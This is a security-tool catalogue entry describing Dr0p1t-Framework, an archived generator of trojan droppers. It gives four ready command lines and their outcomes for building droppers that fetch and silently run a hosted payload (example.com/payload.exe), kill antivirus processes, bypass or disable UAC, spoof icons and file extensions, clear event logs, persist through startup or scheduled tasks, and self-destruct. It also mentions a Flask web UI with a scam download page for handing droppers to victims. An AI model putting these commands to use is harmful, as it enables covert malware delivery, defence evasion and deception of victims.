---
name: "dr0p1t-framework"
categories:
  - blackarch-backdoor
version: "44.db9bc2d"
homepage: "https://github.com/D4Vinci/Dr0p1t-Framework"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "D4Vinci/Dr0p1t-Framework"
github-stars: 1478
github-pushed: "2018-11-03"
github-archived: true
github-issues: 5
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.6
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# dr0p1t-framework

> Build a small trojan dropper that downloads your payload on the target, runs it quietly and cleans up after itself.

## What it's for

Dr0p1t generates a compiled dropper around a payload you host: the dropper fetches the payload from a URL on the target system and executes it silently, with a bag of AV-evasion and persistence tricks — killing antivirus processes first, running your own batch/PowerShell/VBS pre-flight scripts, UAC bypass/disable, running as admin, spoofing the dropper's icon and extension, UPX-packing, clearing the event log, and self-destructing (with content-wiped files) when done. Persistence modules add the downloaded payload to startup, the task scheduler, or the PowerShell user profile. It can build Windows, Linux and (less-tested) macOS droppers, and ships Dr0p1t-Server, a Flask web UI for generating droppers from a browser. The framework is archived and unmaintained — its Python 2/3.5-era toolchain and evasion tricks predate modern EDR, so treat it as a historical dropper generator rather than a current bypass solution.

## Typical use cases

### Build a persistent stealthy dropper

One command combining download, persistence and anti-AV measures.

```
./Dr0p1t.py https://example.com/payload.exe -s -t -k --runas --upx
```

Outcome: compiles a UPX-packed dropper that, on the target, kills running AV processes, elevates via UAC bypass, downloads `payload.exe` from the URL, adds it to both startup and the task scheduler, then wipes itself — the classic all-options invocation.

### Pre-flight script and architecture pinning

Run your own script before the payload and target one architecture.

```
./Dr0p1t.py https://example.com/payload.exe -k -b block_online_scan.bat --only32
```

Outcome: a 32-bit-only dropper that executes `scripts/block_online_scan.bat` before downloading and running the payload (`-p`/`-v` select PowerShell/VBS pre-flight scripts the same way, with execution policy bypassed).

### Deliver a spoofed payload inside a zip

Disguise the dropper as a document and fetch a compressed payload.

```
./Dr0p1t.py https://example.com/payload.zip -t -k --nouac -i flash.ico --spoof pdf --zip
```

Outcome: a dropper bearing `icons/flash.ico` and a spoofed `.pdf` extension that downloads the zipped payload (unpacking it first), tries to disable UAC, kills AV, and persists via the task scheduler.

### Generate droppers from the browser

Use the bundled web interface instead of the CLI.

```
python Dr0p1t_Server.py
```

Outcome: starts the Flask Dr0p1t-Server on port 5000; opening it in a browser gives the same generation form remotely, plus a customizable scam download page (replace `Scam.html`) to hand the dropper to the victim.

*No corpus evidence — derived from upstream documentation.*
